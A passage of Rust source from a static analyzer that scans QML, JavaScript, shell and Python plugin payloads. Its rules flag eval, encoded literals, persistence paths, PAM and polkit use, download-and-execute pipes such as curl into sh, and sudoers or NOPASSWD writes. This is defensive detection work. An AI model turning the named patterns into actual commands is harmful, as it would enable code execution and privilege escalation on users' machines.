            outcome.result_parts.push(parts(
                "oma.qml.pam-authentication",
                number,
                "pam-surface",
                Confidence::LexicalFallback,
            ));
        }
        if find_word(line, "WlSessionLock").is_some() {
            outcome.result_parts.push(parts(
                "oma.qml.session-lock",
                number,
                "session-lock-surface",
                Confidence::LexicalFallback,
            ));
        }
        if lower_contains(line, "clipboard") {
            outcome.capabilities.push(occurrence(
                Capability::ClipboardAccess,
                language,
                number,
                "clipboard-token",
            ));
        }
        // Hyprland* type prefixes don't satisfy word-end boundaries, so a
        // plain containment check applies; this family is capability-level.
        if line.contains("Hyprland") || line.contains("Wlr") || find_word(line, "hyprctl").is_some()
        {
            outcome.capabilities.push(occurrence(
                Capability::CompositorControl,
                language,
                number,
                "compositor-token",
            ));
        }
        // Dynamic-code needles must appear as live code, not inside quoted
        // string values. `createComponent`/`include` are matched through the
        // same Qt-global receiver verification the sink detection uses (H2
        // review): `backend.Qt.createComponent(...)` is a member named Qt,
        // not the Qt API, while `Qt . createComponent(...)` with whitespace
        // around the dot IS the Qt API and must not lose its dynamic-code
        // finding.
        let code = unquoted_text(line);
        if find_word(&code, "eval(").is_some()
            || find_word(&code, "createQmlObject(").is_some()
            || find_word(&code, "atob(").is_some()
            || !find_qt_global_calls(&code, "createComponent").is_empty()
            || !find_qt_global_calls(&code, "include").is_empty()
            || code.contains("new Function")
        {
            outcome.result_parts.push(parts(
                DYNAMIC_CODE_RULE,
                number,
                "dynamic-code-construction",
                Confidence::LexicalFallback,
            ));
            outcome.capabilities.push(occurrence(
                Capability::DynamicCodeExecution,
                language,
                number,
                line.trim(),
            ));
        }
        for literal in line_literals(line) {
            if let Some(length) = encoded_literal_length(literal) {
                outcome.result_parts.push(parts(
                    OBFUSCATION_RULE,
                    number,
                    format!("encoded-literal:{length}"),
                    Confidence::LexicalFallback,
                ));
                break;
            }
        }
        let persistence_path = (line.contains("autostart")
            || line.contains("systemd/user")
            || line.contains(".config/systemd"))
            && find_word(line, "FileView").is_some();
        if persistence_path {
            outcome.result_parts.push(parts(
                PERSISTENCE_RULE,
                number,
                "persistence-location",
                Confidence::LexicalFallback,
            ));
        }
        collect_lexical_sink_references(line, &code, number, &mut outcome);
        collect_quoted_references(line, number, &mut outcome.references);
    }

    outcome
}

fn lower_contains(haystack: &str, needle: &str) -> bool {
    haystack.to_ascii_lowercase().contains(needle)
}

/// Suspicious-provenance judgment over an extracted execution-argument span.
fn evaluate_execution_span(span: &str, kind: SinkKind, number: u32, outcome: &mut FileOutcome) {
    let rule_id = match kind {
        SinkKind::Process => PROCESS_RULE,
        SinkKind::DetachedExecution => DETACHED_RULE,
    };
    let joined = join_line_literals(span);
    if let Some(shell_offset) = find_shell_interpreter(&joined) {
        outcome.result_parts.push(parts(
            rule_id,
            number,
            format!("shell-interpreter-command:{}", &joined[shell_offset..]),
            Confidence::LexicalFallback,
        ));
    } else if span.contains("responseText") || span.contains(".response") || span.contains(".text(")
    {
        outcome.result_parts.push(parts(
            rule_id,
            number,
            "network-response-executed",
            Confidence::LexicalFallback,
        ));
    }
}

/// The bracketed span starting at `open` ('(' or '['): to its matching
/// closer, honoring nesting and quoted strings.
fn balanced_bracket_span(text: &str, open: usize) -> Option<(usize, usize)> {
    let bytes = text.as_bytes();
    let opener = *bytes.get(open)?;
    let closer = match opener {
        b'(' => b')',
        b'[' => b']',
        b'{' => b'}',
        _ => return None,
    };
    let mut depth = 0usize;
    let mut index = open;
    let mut in_string: Option<u8> = None;
    while index < bytes.len() {
        let byte = bytes[index];
        match in_string {
            Some(quote) => {
                if byte == b'\\' {
                    index += 2;
                    continue;
                }
                if byte == quote {
                    in_string = None;
                }
            }
            None => {
                if byte == b'"' || byte == b'\'' {
                    in_string = Some(byte);
                } else if byte == opener {
                    depth += 1;
                } else if byte == closer {
                    depth -= 1;
                    if depth == 0 {
                        return Some((open + 1, index));
                    }
                }
            }
        }
        index += 1;
    }
    None
}

/// The value span after `property:` on one line, stopping at a closing
/// brace/comma at bracket depth zero.
fn binding_value_span(line: &str, property_word_end: usize) -> Option<(usize, usize)> {
    let colon = line[property_word_end..]
        .find(':')
        .map(|offset| property_word_end + offset)?;
    let mut start = colon + 1;
    while start < line.len() && line[start..].starts_with([' ', '\t']) {
        start += 1;
    }
    if start >= line.len() {
        return None;
    }
    let bytes = line.as_bytes();
    if matches!(bytes[start], b'[' | b'(' | b'{') {
        return balanced_bracket_span(line, start).map(|(_, end)| (start, end + 1));
    }
    // Scalar value runs to the first top-level terminator: brace, semicolon,
    // or a line comment. Commented text never participates in provenance.
    // The scan is quote-aware so a `//` INSIDE a quoted value (a URL scheme,
    // H2 review) never truncates the span.
    let mut end = start;
    let mut in_string: Option<u8> = None;
    while end < line.len() {
        let byte = bytes[end];
        match in_string {
            Some(quote) => {
                if byte == b'\\' {
                    end += 2;
                    continue;
                }
                if byte == quote {
                    in_string = None;
                }
            }
            None => {
                if byte == b'"' || byte == b'\'' {
                    in_string = Some(byte);
                } else if matches!(byte, b'}' | b';')
                    || (byte == b'/' && end + 1 < line.len() && bytes[end + 1] == b'/')
                {
                    break;
                }
            }
        }
        end += 1;
    }
    let trimmed = line[start..end.min(line.len())].trim_end();
    Some((start, start + trimmed.len()))
}

/// Comment syntax of the surrounding language. The three real grammars
/// differ and each gets its own rule:
/// - QML/JS: `//` anywhere outside strings except in a scheme (`://`),
/// - Python: an unquoted `#` starts a comment at ANY position,
/// - POSIX shell: `#` starts a comment only at a word boundary.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum CommentStyle {
    /// `// …` — QML/JS.
    DoubleSlash,
    /// `# …` anywhere outside strings — Python.
    PythonHash,
    /// `# …` at word starts (whitespace or a control operator) — POSIX shell.
    ShellHash,
}

/// The executable prefix of a source line under the language's comment rule,
/// honoring quoted strings throughout.
fn strip_line_comment(line: &str, style: CommentStyle) -> &str {
    let bytes = line.as_bytes();
    let mut in_string: Option<u8> = None;
    let mut index = 0usize;
    while index < bytes.len() {
        let byte = bytes[index];
        match in_string {
            Some(quote) => {
                if byte == b'\\' {
                    index += 2;
                    continue;
                }
                if byte == quote {
                    in_string = None;
                }
            }
            None => {
                if byte == b'"' || byte == b'\'' {
                    in_string = Some(byte);
                    // Fall through so the cursor advances past the opening
                    // delimiter; otherwise the same byte immediately closes
                    // the string and markers inside it leak into detectors.
                }
                match style {
                    CommentStyle::DoubleSlash => {
                        if byte == b'/'
                            && index + 1 < bytes.len()
                            && bytes[index + 1] == b'/'
                            // Scheme guard: `https://host` is not a comment.
                            && (index == 0 || bytes[index - 1] != b':')
                        {
                            return &line[..index];
                        }
                    }
                    CommentStyle::PythonHash => {
                        if byte == b'#' {
                            return &line[..index];
                        }
                    }
                    CommentStyle::ShellHash => {
                        // A word starting with `#` begins a comment; word
                        // starts are whitespace, line start, or a control
                        // operator that terminates the preceding command
                        // (`true;# payload` is commented out).
                        if byte == b'#'
                            && (index == 0
                                || matches!(
                                    bytes[index - 1],
                                    b' ' | b'\t' | b';' | b'&' | b'|' | b'('
                                ))
                        {
                            return &line[..index];
                        }
                    }
                }
            }
        }
        index += 1;
    }
    line
}

/// Module name of an `import X.Y <version>` statement (keyword/version/as
/// excluded).
#[cfg(feature = "qml-parser")]
fn import_module_text(source: &str, node: tree_sitter::Node) -> String {
    let mut cursor = node.walk();
    let mut module = String::new();
    let mut children = Vec::new();
    for child in node.children(&mut cursor) {
        children.push(child);
    }
    // The grammar nests the module under nested_identifier when dotted;
    // otherwise a plain identifier. Version numbers are anonymous literals.
    for child in children {
        match child.kind() {
            "nested_identifier" | "identifier" => {
                module.push_str(&source[child.start_byte()..child.end_byte()]);
            }
            _ => {}
        }
    }
    module
}

/// Priority surfaces from imports. Near-zero-legitimacy third-party use of
/// polkit/PAM/session-lock APIs is itself the finding (surface doc); Hyprland/
/// Wayland imports record a compositor-control capability.
#[cfg(feature = "qml-parser")]
fn apply_import_surface(module: &str, line: u32, outcome: &mut FileOutcome) {
    if module.contains("Services.Polkit") {
        outcome.result_parts.push(parts(
            "oma.qml.polkit-agent-ui",
            line,
            "polkit-agent-import",
            Confidence::AstBacked,
        ));
    }
    if module.contains("PamContext") || module.contains("Services.Pam") {
        outcome.result_parts.push(parts(
            "oma.qml.pam-authentication",
            line,
            "pam-context-import",
            Confidence::AstBacked,
        ));
    }
    if module.contains("SessionLock") {
        outcome.result_parts.push(parts(
            "oma.qml.session-lock",
            line,
            "session-lock-import",
            Confidence::AstBacked,
        ));
    }
    if module.contains("Hyprland") || module.ends_with(".Wayland") || module.contains("Wlr") {
        outcome.capabilities.push(occurrence(
            Capability::CompositorControl,
            Language::Qml,
            line,
            &format!("import {module}"),
        ));
    }
}

/// Identifier/property tokens that mark priority or context surfaces.
#[cfg(feature = "qml-parser")]
fn apply_surface_token(
    source: &str,
    node: tree_sitter::Node,
    outcome: &mut FileOutcome,
    line: u32,
) {
    let _ = node;
    let text = &source[node.start_byte()..node.end_byte()];
    match text {
        "WlSessionLock" | "WlSessionLockSurface" => {
            outcome.result_parts.push(parts(
                "oma.qml.session-lock",
                line,
                format!("session-lock-type:{text}"),
                Confidence::AstBacked,
            ));
        }
        "PamContext" => {
            outcome.result_parts.push(parts(
                "oma.qml.pam-authentication",
                line,
                "pam-context-type",
                Confidence::AstBacked,
            ));
        }
        _ => {}
    }
    let lower = text.to_ascii_lowercase();
    if lower.contains("clipboard") {
        outcome.capabilities.push(occurrence(
            Capability::ClipboardAccess,
            Language::Qml,
            line,
            text,
        ));
    } else if text.starts_with("Hyprland") || text.starts_with("Wlr") || lower == "hyprctl" {
        outcome.capabilities.push(occurrence(
            Capability::CompositorControl,
            Language::Qml,
            line,
            text,
        ));
    }
}

/// Length of a base64-shaped literal worth surfacing as an indicator.
fn encoded_literal_length(content: &str) -> Option<usize> {
    let length = content.len();
    if length < 64 {
        return None;
    }
    let mut letters = false;
    let mut digits = false;
    for byte in content.bytes() {
        match byte {
            b'a'..=b'z' | b'A'..=b'Z' => letters = true,
            b'0'..=b'9' => digits = true,
            b'+' | b'/' | b'=' | b'_' | b'-' => {}
            _ => return None,
        }
    }
    (letters && digits).then_some(length)
}
fn find_word(haystack: &str, needle: &str) -> Option<usize> {
    let bytes = haystack.as_bytes();
    let mut start = 0usize;
    while let Some(position) = haystack[start..].find(needle) {
        let absolute = start + position;
        let before_ok = absolute == 0 || !bytes[absolute - 1].is_ascii_alphanumeric();
        let after = absolute + needle.len();
        // Needles ending in punctuation (`eval(`) are followed by identifier
        // characters by design; only word-tailed needles require a word end.
        let requires_word_end = needle
            .chars()
            .last()
            .is_some_and(|character| character.is_ascii_alphanumeric());
        let after_ok =
            !requires_word_end || after >= bytes.len() || !bytes[after].is_ascii_alphanumeric();
        if before_ok && after_ok {
            return Some(absolute);
        }
        start = absolute + needle.len().max(1);
    }
    None
}

/// All quoted literals on one line joined with single spaces, so argv-style
/// sources like `"sh", "-c", "cmd"` reconstruct into scannable text.
fn join_line_literals(line: &str) -> String {
    line_literals(line).join(" ")
}

/// Quoted string literals that look like paths become reference candidates.
fn collect_quoted_references(line: &str, number: u32, references: &mut Vec<ReferenceCandidate>) {
    for literal in line_literals(line) {
        // Decode escapes so context candidates match runtime spelling.
        let decoded = decode_js_escapes(literal);
        if is_path_shaped(&decoded) {
            references.push(ReferenceCandidate {
                line: number,
                value: decoded,
                sink: None,
            });
        }
    }
}

/// Runtime value of the quoted literals inside one span, escapes decoded
/// once at extraction (H2 review).
fn span_sink_literals(span: &str) -> Vec<String> {
    line_literals(span)
        .into_iter()
        .map(decode_js_escapes)
        .collect()
}

/// Sink positions on one lexical line (H2). The AST path marks reference
/// candidates precisely at binding/call nodes; the lexical fallback marks
/// the quoted literals of the binding value or call-argument span — never
/// every literal on the line, so an unrelated literal sharing the line
/// cannot inherit the sink (H2 review). Multi-line constructs degrade to
/// context, a documented lexical limitation — no match never implies clean
/// behavior.
fn collect_lexical_sink_references(line: &str, code: &str, number: u32, outcome: &mut FileOutcome) {
    // Import statements: the first quoted literal is the module specifier.
    if code.split_whitespace().next() == Some("import") {
        if let Some(specifier) = line_literals(line).into_iter().next() {
            let decoded = decode_js_escapes(specifier);
            apply_directory_import(&decoded, number, outcome);
        }
        return;
    }
    // Qt load-sink calls: only the FIRST argument (the URL) of a call whose
    // receiver is the Qt GLOBAL. `backend.Qt.createComponent(...)` (a member
    // named Qt) is not the Qt API and must not match; `Qt . createComponent(`
    // with whitespace around the dot IS the same call and must match.
    for (method, sink) in [
        ("createComponent", SinkPosition::CreateComponent),
        ("include", SinkPosition::Include),
    ] {
        for open_paren in find_qt_global_calls(code, method) {
            if let Some((start, end)) = first_argument_span(line, open_paren) {
                for literal in span_sink_literals(&line[start..end]) {
                    record_sink_reference(&literal, sink, number, outcome);
                }
            }
        }
    }
    // Binding sinks: only the value span after the binding word.
    mark_binding_literals(
        line,
        code,
        "Loader",
        "source",
        SinkPosition::LoaderSource,
        number,
        outcome,
    );
    mark_binding_literals(
        line,
        code,
        "FileView",
        "path",
        SinkPosition::FileViewPath,
        number,
        outcome,
    );
}

/// Mark the quoted literals of each `<binding_word>: <value>` binding value
/// span that lies INSIDE a `<object_word> { … }` object's brace span, at
/// brace depth zero of that object's initializer.
///
/// The binding must be scoped to the matching object's braces, not merely
/// share a line with the object word: `Loader {} Image { source: "…" }` must
/// not treat `Image.source` as `Loader.source`. Nested child objects must
/// not inherit the outer sink either — `Loader { Image { source: "…" } }`
/// carries the nested type's own semantics, so only depth-zero bindings
/// participate (H2 review). When the object's braces do not close on the
/// same line (a multi-line object), the span is unresolved and the construct
/// degrades to context — a documented lexical limitation.
fn mark_binding_literals(
    line: &str,
    code: &str,
    object_word: &str,
    binding_word: &str,
    sink: SinkPosition,
    number: u32,
    outcome: &mut FileOutcome,
) {
    let mut search_from = 0usize;
    while let Some(relative) = find_word(&code[search_from..], object_word) {
        let word_end = search_from + relative + object_word.len();
        search_from = word_end;
        // The object declaration is `<object_word> {`; only whitespace may sit
        // between the word and its opening brace.
        let Some(brace_open) = object_brace_open(code, word_end) else {
            continue;
        };
        let Some((body_start, body_end)) = balanced_bracket_span(line, brace_open) else {
            continue; // multi-line object: degrade to context
        };
        let body_end = body_end.min(code.len());
        if body_start > body_end {
            continue;
        }
        // Only the depth-zero segments of the object body participate:
        // segments inside a nested `{ … }` belong to a child object with its
        // own type. Slicing at brace bytes is UTF-8 safe (braces are ASCII
        // and cannot occur inside a multi-byte character).
        let body = &code[body_start..body_end];
        let mut segments: Vec<(usize, &str)> = Vec::new();
        let mut depth = 0usize;
        let mut segment_start = 0usize;
        for (offset, byte) in body.bytes().enumerate() {
            match byte {
                b'{' => {
                    depth += 1;
                    if depth == 1 {
                        segments.push((segment_start, &body[segment_start..offset]));
                    }
                }
                b'}' => {
                    depth -= 1;
                    if depth == 0 {
                        segment_start = offset + 1;
                    }
                }
                _ => {}
            }
        }
        if depth == 0 {
            segments.push((segment_start, &body[segment_start..]));
        }
        for (segment_offset, segment) in segments {
            let mut inner_from = 0usize;
            while let Some(rel) = find_word(&segment[inner_from..], binding_word) {
                let match_start = inner_from + rel;
                inner_from = match_start + binding_word.len();
                // Map the segment offset back to the line; `body` starts at
                // `body_start` and `code` is a prefix of `line`, so offsets
                // align.
                let property_word_end = body_start + segment_offset + inner_from;
                if let Some((start, end)) = binding_value_span(line, property_word_end) {
                    for literal in span_sink_literals(&line[start..end]) {
                        record_sink_reference(&literal, sink, number, outcome);
                    }
                }
            }
        }
    }
}

/// Byte index of the `{` that opens a `<object_word> {` object declaration,
/// i.e. the first non-whitespace byte after the object word must be `{`.
fn object_brace_open(code: &str, after_word: usize) -> Option<usize> {
    let bytes = code.as_bytes();
    let index = skip_ascii_ws(bytes, after_word);
    (bytes.get(index) == Some(&b'{')).then_some(index)
}

/// Advance past ASCII spaces and tabs.
fn skip_ascii_ws(bytes: &[u8], mut index: usize) -> usize {
    while index < bytes.len() && matches!(bytes[index], b' ' | b'\t') {
        index += 1;
    }
    index
}

/// Byte indices of the `(` opening each `Qt.<method>(` call whose receiver is
/// the Qt GLOBAL. Tolerates whitespace around the `.` and before the `(`, and
/// rejects a `Qt` that is itself a member/identifier part (e.g.
/// `backend.Qt.<method>`, `myQt.<method>`).
fn find_qt_global_calls(code: &str, method: &str) -> Vec<usize> {
    let bytes = code.as_bytes();
    let mut result = Vec::new();
    let mut from = 0usize;
    while let Some(relative) = find_word(&code[from..], "Qt") {
        let qt_start = from + relative;
        let qt_end = qt_start + 2;
        from = qt_end;
        // Receiver must be the Qt global, not a member or a longer identifier.
        // `find_word` already excludes an alphanumeric predecessor; also reject
        // a member-access dot and identifier-continuation bytes.
        if qt_start > 0 && matches!(bytes[qt_start - 1], b'.' | b'_' | b'$') {
            continue;
        }
        let mut index = skip_ascii_ws(bytes, qt_end);
        if bytes.get(index) != Some(&b'.') {
            continue;
        }
        index = skip_ascii_ws(bytes, index + 1);
        if !code[index..].starts_with(method) {
            continue;
        }
        let method_end = index + method.len();
        if bytes
            .get(method_end)
            .is_some_and(|byte| byte.is_ascii_alphanumeric() || matches!(byte, b'_' | b'$'))
        {
            continue; // method name is a prefix of a longer identifier
        }
        let paren = skip_ascii_ws(bytes, method_end);
        if bytes.get(paren) != Some(&b'(') {
            continue;
        }
        result.push(paren);
        from = paren + 1;
    }
    result
}

/// The span of the FIRST argument inside a `(` at `open_paren` — from just
/// after the paren to the first top-level comma or the matching close paren.
/// Only the first argument of a load sink is the URL (H2 review).
fn first_argument_span(line: &str, open_paren: usize) -> Option<(usize, usize)> {
    let (inner_start, close) = balanced_bracket_span(line, open_paren)?;
    let bytes = line.as_bytes();
    let mut index = inner_start;
    let mut depth = 0usize;
    let mut in_string: Option<u8> = None;
    while index < close {
        let byte = bytes[index];
        match in_string {
            Some(quote) => {
                if byte == b'\\' {
                    index += 2;
                    continue;
                }
                if byte == quote {
                    in_string = None;
                }
            }
            None => match byte {
                b'"' | b'\'' => in_string = Some(byte),
                b'(' | b'[' | b'{' => depth += 1,
                b')' | b']' | b'}' => depth = depth.saturating_sub(1),
                b',' if depth == 0 => return Some((inner_start, index)),
                _ => {}
            },
        }
        index += 1;
    }
    Some((inner_start, close))
}

fn line_literals(line: &str) -> Vec<&str> {
    let bytes = line.as_bytes();
    let mut literals = Vec::new();
    let mut index = 0usize;
    while index < bytes.len() {
        let quote = bytes[index];
        if quote != b'"' && quote != b'\'' {
            index += 1;
            continue;
        }
        match line[index + 1..].find(quote as char) {
            Some(length) => {
                literals.push(&line[index + 1..index + 1 + length]);
                index += length + 2;
            }
            None => break,
        }
    }
    literals
}

/// The line with quoted-literal contents blanked so detector needles inside
/// string values never satisfy them. Quote characters become spaces to keep
/// offsets and word boundaries stable.
fn unquoted_text(line: &str) -> String {
    let bytes = line.as_bytes();
    let mut blanked = bytes.to_vec();
    let mut index = 0usize;
    while index < bytes.len() {
        let quote = bytes[index];
        if quote != b'"' && quote != b'\'' {
            index += 1;
            continue;
        }
        blanked[index] = b' ';
        match line[index + 1..].find(quote as char) {
            Some(length) => {
                for slot in &mut blanked[index + 1..index + 1 + length] {
                    *slot = b' ';
                }
                blanked[index + 1 + length] = b' ';
                index += length + 2;
            }
            None => break,
        }
    }
    String::from_utf8_lossy(&blanked).into_owned()
}

/// One detector observation before path anchoring.
struct ResultParts {
    rule_id: &'static str,
    line: Option<u32>,
    semantic_value: String,
    confidence: Confidence,
}

// ---------------------------------------------------------------------------
// Public per-language entry points.
// ---------------------------------------------------------------------------

fn analyze_javascript_source(source: &str) -> FileOutcome {
    lexical_scan(source, Language::JavaScript)
}

/// Minimal high-signal lexical rules for bundled shell/Python payloads.
/// Coverage is always labelled `partial`; no match never implies clean.
fn analyze_script_source(source: &str, kind: PayloadKind) -> FileOutcome {
    let mut outcome = FileOutcome {
        result_parts: Vec::new(),
        capabilities: Vec::new(),
        references: Vec::new(),
        parse_degraded: false,
        confidence: Confidence::LexicalFallback,
    };
    let language = match kind {
        PayloadKind::Python => Language::Python,
        _ => Language::Shell,
    };
    let (download_rule, privilege_rule) = match kind {
        PayloadKind::Python => (PYTHON_DOWNLOAD_EXECUTE_RULE, PYTHON_PRIVILEGE_RULE),
        _ => (SCRIPT_DOWNLOAD_EXECUTE_RULE, SCRIPT_PRIVILEGE_RULE),
    };

    for (index, raw_line) in source.lines().enumerate() {
        let number = index as u32 + 1;
        let comment_style = match kind {
            PayloadKind::Python => CommentStyle::PythonHash,
            _ => CommentStyle::ShellHash,
        };
        let line = strip_line_comment(raw_line, comment_style);
        if line.is_empty() {
            continue;
        }

        // Download-and-execute: fetcher feeding an interpreter through a
        // pipe, or Python fetching straight into exec/system. Needles and
        // pipe delimiters inside quoted strings never count as provenance.
        let code = unquoted_text(line);
        let downloads = find_word(&code, "curl").is_some() || find_word(&code, "wget").is_some();
        let pipes_to_interpreter = code.split('|').skip(1).any(|segment| {
            let trimmed = segment.trim();
            let head = trimmed.split_whitespace().next().unwrap_or("");
            let basename = head.rsplit('/').next().unwrap_or(head);
            matches!(
                basename,
                "sh" | "bash" | "dash" | "zsh" | "ksh" | "ash" | "python" | "python3"
            )
        });
        let python_fetch_to_exec = matches!(kind, PayloadKind::Python)
            && (code.contains("urlopen")
                || code.contains("requests.get")
                || code.contains("urllib"))
            && (code.contains("os.system")
                || code.contains("subprocess")
                || code.contains("exec(")
                || code.contains("eval("));
        if (downloads && pipes_to_interpreter) || python_fetch_to_exec {
            outcome.result_parts.push(parts(
                download_rule,
                number,
                "download-execute",
                Confidence::LexicalFallback,
            ));
        }

        // Privilege escalation: an actual passwordless grant or a sudoers
        // WRITE. Read-only inspection (`grep NOPASSWD`, `cat`) and bare
        // sudo/pkexec invocation stay capability-level, matching the rule
        // summary's meaning. Both grant predicates require a real write
        // context — a sudoers mention alone is not a grant.
        let write_indicator = line.contains(">")
            || line.contains(">>")
            || line.contains("tee ")
            || line.contains("visudo")
            || line.contains("sed -i")
            || line.contains("chattr")
            || line.contains(".write(");
        // Read-only inspection of sudoers policy is not a grant.
        let first_word = line
            .split_whitespace()
            .next()
            .unwrap_or("")
            .rsplit('/')
            .next()
            .unwrap_or("");
        let readonly_inspection = matches!(
            first_word,
            "grep" | "cat" | "less" | "head" | "tail" | "stat" | "journalctl"
        );
        let grant_write_context = write_indicator && !readonly_inspection;
        let sudoers_write = line.contains("sudoers") && grant_write_context;
        let nopasswd_grant = line.contains("NOPASSWD") && grant_write_context;
        if nopasswd_grant || sudoers_write {
            outcome.result_parts.push(parts(
                privilege_rule,
                number,
                if nopasswd_grant {
                    "passwordless-root"
                } else {
                    "sudoers-write"
                },
                Confidence::LexicalFallback,
            ));
        }
        if ["sudo ", "pkexec ", "doas "]
            .iter()
            .any(|token| line.contains(token))
        {
            outcome.capabilities.push(occurrence(
                Capability::ProcessExecution,
                language,
                number,
                line.trim(),
            ));
        }
        if find_word(line, "systemctl").is_some()
            || find_word(line, "systemd-run").is_some()
            || find_word(line, "rc-service").is_some()
        {
            outcome.capabilities.push(occurrence(
                Capability::PersistenceScheduling,
                language,
                number,
                line.trim(),
            ));
        }
        if find_word(line, "pacman").is_some()
            || find_word(line, "paru").is_some()
            || find_word(line, "yay").is_some()
            || find_word(line, "apt-get").is_some()
            || find_word(line, "dnf ").is_some()
        {
            outcome.capabilities.push(occurrence(
                Capability::ProcessExecution,
                language,
                number,
                line.trim(),
            ));
        }
    }

    outcome
}

/// Plugin manifests feed context-level results and capability context that
/// influence review priority without ever asserting malicious behavior.
fn apply_manifest_context(content: &[u8], relative_path: &str, artifacts: &mut AnalysisArtifacts) {
    let value = match serde_json::from_slice::<serde_json::Value>(content) {
        Ok(value) => value,
        Err(_) => {
            artifacts
                .limitations
                .push(format!("manifest-context-unreadable:{relative_path}"));
            return;
        }
    };
    // Both the installed layout (`plugins: [...]`) and single-plugin trees
    // (`kinds` at top level or under one plugin object) are accepted.
    let mut kinds_lists: Vec<serde_json::Value> = Vec::new();
    if let Some(plugins) = value.get("plugins").and_then(serde_json::Value::as_array) {
        for plugin in plugins {
            if let Some(kinds) = plugin.get("kinds") {
                kinds_lists.push(kinds.clone());
            }
        }
    } else if let Some(kinds) = value.get("kinds") {
        kinds_lists.push(kinds.clone());
    }
    let mut seen_bar = false;
    let mut seen_service = false;
    for kinds_value in &kinds_lists {
        let Some(kinds) = kinds_value.as_array() else {
            continue;
        };
        for kind in kinds.iter().filter_map(serde_json::Value::as_str) {
            match kind {
                "bar" => seen_bar = true,
                "service" => seen_service = true,
                _ => {}
            }
        }
    }
    if !seen_bar && !seen_service {
        return;
    }
    if seen_bar
        && let Ok(result) = NormalizedResult::new(
            REPLACES_BAR_RULE,
            relative_path,
            None,
            None,
            "replaces-bar-context",
            None,
        )
    {
        artifacts.results.push(result);
    }
    if seen_service {
        let mut occurrence = occurrence(
            Capability::PersistenceScheduling,
            Language::Context,
            1,
            "headless-service-kind",
        );
        occurrence.relative_path = relative_path.to_owned();
        artifacts.capabilities.push(occurrence);
    }
}

#[cfg(feature = "qml-parser")]
fn analyze_qml_source(source: &str) -> FileOutcome {
    match crate::qml::parse_qml(source.as_bytes()) {
        Some(tree) => ast_scan_qml(source, &tree),
        None => lexical_scan(source, Language::Qml),
    }
}

#[cfg(not(feature = "qml-parser"))]
fn analyze_qml_source(source: &str) -> FileOutcome {
    lexical_scan(source, Language::Qml)
}

// ---------------------------------------------------------------------------
// AST-backed QML analysis (qml-parser feature).
// ---------------------------------------------------------------------------

#[cfg(feature = "qml-parser")]
mod ast {
    use super::*;

    /// Classified value of a binding or call argument.
    enum Value {
        Static(String),
        Dynamic(&'static str),
    }

    pub(super) fn scan(source: &str, tree: &tree_sitter::Tree) -> FileOutcome {
        let mut outcome = FileOutcome {
            result_parts: Vec::new(),
            capabilities: Vec::new(),
            references: Vec::new(),
            parse_degraded: tree.root_node().has_error(),
            confidence: Confidence::AstBacked,
        };
        let mut flags = LexFlags {
            detached_any: None,
            network: None,
        };

        let mut stack = vec![tree.root_node()];
        while let Some(node) = stack.pop() {
            let kind = node.kind();
            match kind {
                "ui_import" => {
                    let module = import_module_text(source, node);
                    if !module.is_empty() {
                        apply_import_surface(&module, number_of(node), &mut outcome);
                    }
                    // Directory imports spell the module as a string:
                    // `import "./dialogs" as D`.
                    let mut import_cursor = node.walk();
                    let import_children: Vec<tree_sitter::Node> =
                        node.children(&mut import_cursor).collect();
                    for child in import_children {
                        if child.kind() == "string" {
                            let specifier = string_literal_content(source, child);
                            if !specifier.is_empty() {
                                apply_directory_import(&specifier, number_of(node), &mut outcome);
                            }
                        }
                    }
                }
                "ui_object_definition" => {
                    handle_object_definition(source, node, &mut outcome);
                    // Loader { source: <expr> }: computed sources are
                    // dynamic reference sinks. Qualified spellings
                    // (`QQ.Loader`) resolve through the terminal type
                    // segment (H2 review).
                    let is_loader = object_type_node(source, node).is_some_and(|type_node| {
                        terminal_segment(node_text(source, type_node)) == "Loader"
                    });
                    if is_loader && binding_value_named(source, node, "source").is_some() {
                        let binding = binding_value_named(source, node, "source").unwrap();
                        {
                            match classify_value(source, binding) {
                                Value::Static(text) => {
                                    record_sink_reference(
                                        &text,
                                        SinkPosition::LoaderSource,
                                        number_of(binding),
                                        &mut outcome,
                                    );
                                }
                                Value::Dynamic(_) => {
                                    outcome.result_parts.push(parts(
                                        DYNAMIC_REFERENCE_RULE,
                                        number_of(binding),
                                        format!(
                                            "dynamic-reference-sink:Loader.source:{}",
                                            node_text(source, unwrap_expression_statement(binding))
                                                .chars()
                                                .take(120)
                                                .collect::<String>()
                                        ),
                                        Confidence::AstBacked,
                                    ));
                                }
                            }
                        }
                    }
                }
                "call_expression" => {
                    handle_call_expression(source, node, &mut outcome, &mut flags);
                }
                "identifier" | "property_identifier" => {
                    let token_line = ast::number_of(node);
                    apply_surface_token(source, node, &mut outcome, token_line);
                }
                "string" => {
                    let content = string_literal_content(source, node);
                    if let Some(length) = encoded_literal_length(&content) {
                        outcome.result_parts.push(parts(
                            OBFUSCATION_RULE,
                            number_of(node),
                            format!("encoded-literal:{length}"),
                            Confidence::AstBacked,
                        ));
                    }
                }
                "new_expression" => {
                    if node.child_count() >= 2
                        && node_text(source, node.child(1).unwrap()) == "Function"
                    {
                        // Runtime code construction via the Function
                        // constructor is equivalent to eval for review
                        // purposes.
                        outcome.result_parts.push(parts(
                            DYNAMIC_CODE_RULE,
                            number_of(node),
                            "dynamic-code-construction:new Function",
                            Confidence::AstBacked,
                        ));
                        outcome.capabilities.push(occurrence(
                            Capability::DynamicCodeExecution,
                            Language::Qml,
                            number_of(node),
                            "new Function",
                        ));
                    }
                    if node.child_count() >= 2
                        && node_text(source, node.child(1).unwrap()) == "XMLHttpRequest"
                    {
                        flags.network.get_or_insert(number_of(node));
                        outcome.capabilities.push(occurrence(
                            Capability::NetworkAccess,
                            Language::Qml,
                            number_of(node),
                            "new XMLHttpRequest",
                        ));
                    } else if node.child_count() >= 2
                        && node_text(source, node.child(1).unwrap()) == "WebSocket"
                    {
                        flags.network.get_or_insert(number_of(node));
                        outcome.capabilities.push(occurrence(
                            Capability::NetworkAccess,
                            Language::Qml,
                            number_of(node),
                            "new WebSocket",
                        ));
                    }
                }
                _ => {}
            }
            let mut cursor = node.walk();
            stack.extend(node.children(&mut cursor));
        }

        // Literal references: path-shaped strings in reference positions.
        collect_ast_references(source, tree, &mut outcome.references);

        outcome
    }

    pub(super) fn number_of(node: tree_sitter::Node) -> u32 {
        node.start_position().row as u32 + 1
    }

    fn node_text<'a>(source: &'a str, node: tree_sitter::Node) -> &'a str {
        &source[node.start_byte()..node.end_byte()]
    }

    /// The object-definition type node: an identifier or a
    /// nested_identifier for qualified spellings (`QtQuick as QQ` ->
    /// `QQ.Loader`), which the grammar permits (H2 review).
    fn object_type_node<'a>(
